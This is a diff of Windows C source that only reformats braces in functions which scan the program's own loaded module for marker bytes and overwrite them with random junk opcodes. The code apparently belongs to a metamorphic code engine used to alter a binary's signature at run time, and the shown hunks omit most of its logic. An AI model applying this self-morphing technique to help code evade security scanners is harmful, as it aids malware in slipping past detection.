@@ -46,11 +46,9 @@ INT morphModule() {
     HMODULE hModule = GetModuleHandle(NULL);
 
     // If the module information is obtained successfully, enter the loop.
-    if (GetModuleInformation(hProcess, hModule, &modInfo, sizeof(MODULEINFO)))
-    {
+    if (GetModuleInformation(hProcess, hModule, &modInfo, sizeof(MODULEINFO))){
         // Check if module size is less than MAXDWORD.
-        if (modInfo.SizeOfImage < MAXDWORD)
-        {
+        if (modInfo.SizeOfImage < MAXDWORD){
 
             // Declare the byte pointer to the last matching pattern and the match offset.
             PBYTE pbyLastMatch = 0;
@@ -68,8 +66,7 @@ INT morphModule() {
             mem_cpy(markerAddr,marker_bytes,MARKER_SIZE);
 
             // Iterate through memory regions of the current process's module to search for the marker pattern.
-            while (!bMorphingFinished)
-            {
+            while (!bMorphingFinished){
 
                 // Call the findPattern function to search for the marker pattern in memory.
                 PVOID startAddr= (PVOID)modInfo.lpBaseOfDll;
@@ -77,15 +74,12 @@ INT morphModule() {
                 pbyLastMatch = findPattern(startAddr, modInfo.SizeOfImage, markerAddr, NULL, MARKER_SIZE);
 
                 // If the marker pattern is found, replace it with random opcodes and update the offsets.
-                if (pbyLastMatch != NULL)
-                {
+                if (pbyLastMatch != NULL){
 
                     morphMemory(pbyLastMatch, (BYTE) MARKER_SIZE);
 
-                }
+                }else{
                     // If the marker pattern is not found, set the morphing status to finished.
-                else
-                {
                     returnValue = 0;
                     bMorphingFinished = TRUE;
                 }
@@ -99,8 +93,7 @@ INT morphModule() {
 }
 
 
-int morphMemory(PBYTE pbyDst, BYTE byLength)
-{
+int morphMemory(PBYTE pbyDst, BYTE byLength){
 
     /*                  *
     *** JUNK CODE ALGO ***
@@ -112,8 +105,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 
     // Initialize a flag to seed the random number generator
     static BOOL bSetSeed = TRUE;
-    if (bSetSeed)
-    {
+    if (bSetSeed){
         srand((UINT)time(NULL));
         bSetSeed = FALSE;
     }
@@ -125,8 +117,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
     // Determine whether to insert a NOP instruction at the beginning of the opcodes
 
     BOOL bPlaceNop = (rand() % 2) ? TRUE : FALSE;
-    if (bPlaceNop)
-    {
+    if (bPlaceNop){
         morphedOpcodes[byOpcodeIt] = ASM_OPCODE_NOP;
         byOpcodeIt++;
     }
@@ -191,8 +182,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 }
 
 // pszMask reserved for future use
-PVOID findPattern(PVOID pData, SIZE_T uDataSize, PVOID pPattern, PCHAR pszMask, SIZE_T uPatternSize)
-{
+PVOID findPattern(PVOID pData, SIZE_T uDataSize, PVOID pPattern, PCHAR pszMask, SIZE_T uPatternSize){
 
     SIZE_T remainingLen = uDataSize;
     //_tprintf("findPattern!\n");
